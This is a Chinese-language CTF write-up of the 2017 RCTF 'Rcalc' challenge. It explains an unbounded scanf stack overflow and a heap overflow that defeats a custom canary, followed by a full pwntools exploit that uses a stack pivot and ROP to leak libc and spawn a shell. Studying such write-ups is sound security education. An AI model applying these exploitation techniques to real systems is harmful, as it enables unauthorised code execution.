---
title: 2017 RCTF Rcalc
date: 2017-05-28 10:44:45
tags:
- stackoverflow
- stack pivot
categories:
- ctf_practice
---

这题Rcalc，看到题第一印象出现了boston-key-party-2016的两个[pwn](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn)题，可惜我没做~~本来打算做的，被大大小小的事耽搁了。

## Challenge
首先找洞，我找的是个栈溢出和堆溢出。
<!-- more -->
```c
__int64 level1_func()
{
  __int64 result; // rax@1
  char name; // [sp+0h] [bp-110h]@1
  __int64 v2; // [sp+108h] [bp-8h]@1

  v2 = get_rand();
  printf("Input your name pls: ");
  __isoc99_scanf("%s", &name);
  printf("Hello %s!\nWelcome to RCTF 2017!!!\n", &name);
  puts("Let's try our smart calculator");
  main_handle("Let's try our smart calculator");
  result = get_rand_2();
  if ( result != v2 )
    failed();
```

看这个scanf，没加长度限制啊，而且没开栈保护，美滋滋。(我TM服了，这虚拟机总出问题)

## Exploit
以前总没太在意stack pivot这种技术(可能经验太少吧~~)，现在觉得挺有用的，这题就需要利用leave指令来改变栈指针。
需要注意的是有检测v2是否被覆盖，这就相当于开了栈保护了。但是我们是可以控制v2和result的。
```c
__int64 get_rand_2()
{
  return *(*(malloc_0x10_2 + 8) + 8LL * (*malloc_0x10_2)-- - 8);
}
```
从main_handle返回时，*malloc_0x10_2等于1，所以其实最后get_rand_2返回的值为malloc(0x320)上的第一个long类型的值。我前面没看仔细，main_handle里面的检测是可以通过的，因为在main_handle里面执行get_rand_2时，*malloc_0x10_2等于2，比较的是p2这个堆块中的第二个long类型的值。
```shell
	---------------
	|malloc(0x10) |
	|--------------
	|malloc(0x10) |
	|-------------|
	|malloc(0x100)|<---saving results
	|-------------|
	|malloc(0x320)| p2
	|-------------|
```
可以通过不断save results来溢出使最后一次结果存到p2上。美滋滋，先存0x100/8=0x22次然后在存一次就行了。接下来就是ROP了。其实就一普通栈溢出，没什么难的，栈溢出就那么点套路，不像堆那样套路满满。

```python
#!/usr/bin python
from pwn import *

debug = 1
gdb_debug = 1

if debug:
  p = process('./Rcalc')
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  #context.log_level = "debug"
else:
  p = remote('rcalc.2017.teamrois.cn', 2333)
  libc = ELF('libc.so.6')

elf = ELF('Rcalc')

def add(int1, int2):
  p.recvuntil("Your choice:")
  p.sendline('1')
  p.recvuntil("input 2 integer: ")
  p.sendline(str(int1))
  p.sendline(str(int2))
  p.recvuntil("Save the result? ")
  p.sendline("yes")

mov3_call = 0x401100 
pop6_ret = 0x40111A
pop_rdi_ret = 0x401123
#however, 0x400cbd not working
#0x0000000000400cbd : leave; ret
leave_ret = 0x401034

bss = 0x602300
read_got = elf.got['read']
'''
we must attention that when scanf will stop read data from streams
when space character, tab character, line feeds and some othter characters
read_got includes '\x20', so we must do a little deal with it
'''
#read(0, bss, 0x100) and stack pivot
payload = 'a' * 0x108
payload += p64(2)
payload += 'b' * 8
payload += p64(pop6_ret)
payload += p64(0x60)
payload += p64(0x60 + 1)
payload += p64(0x601D50)
payload += p64(0x100)
payload += p64(bss)
payload += p64(0)
payload += p64(mov3_call)
payload += 'a' * 8
payload += p64(0)
payload += p64(bss -8)  #rbp
payload += 'a' * 32
payload += p64(leave_ret)

p.recvuntil("Input your name pls: ")
p.sendline(payload)

#heap overflow 
for i in range(0x22):
  add(1, 1)
add(1, 1)

p.recvuntil("Your choice:")
p.sendline('5')
#gdb.attach(p)

puts_plt = elf.symbols['puts']
payload2 = p64(pop_rdi_ret)
payload2 += p64(read_got)
payload2 += p64(puts_plt)
#read(0, bss + 0x100, 0x100) and stack pivot
#avoid to overlap previous stack data
payload2 += p64(pop6_ret)
payload2 += p64(0)
payload2 += p64(1)
payload2 += p64(read_got)
payload2 += p64(0x100)
payload2 += p64(bss + 0x100)
payload2 += p64(0)
payload2 += p64(mov3_call)
payload2 += 'a' * 8
payload2 += p64(0)
payload2 += p64(bss -8 + 0x100)  #rbp
payload2 += 'a' * 32
payload2 += p64(leave_ret) #mov rsp, rbp; pop rbp

p.sendline(payload2)
read_addr = u64(p.recv(6).ljust(8, '\x00'))
print "read_addr: " + hex(read_addr)
libc_addr = read_addr - libc.symbols['read']
print "libc_addr: " + hex(libc_addr)
system_addr = libc_addr + libc.symbols['system']
print "system_addr: " + hex(system_addr)
binsh_addr = libc_addr + next(libc.search('/bin/sh'))
print "binsh_addr: " + hex(binsh_addr)

payload3 = p64(pop_rdi_ret)
payload3 += p64(binsh_addr)
payload3 += p64(system_addr)

p.sendline(payload3)

p.interactive()
```






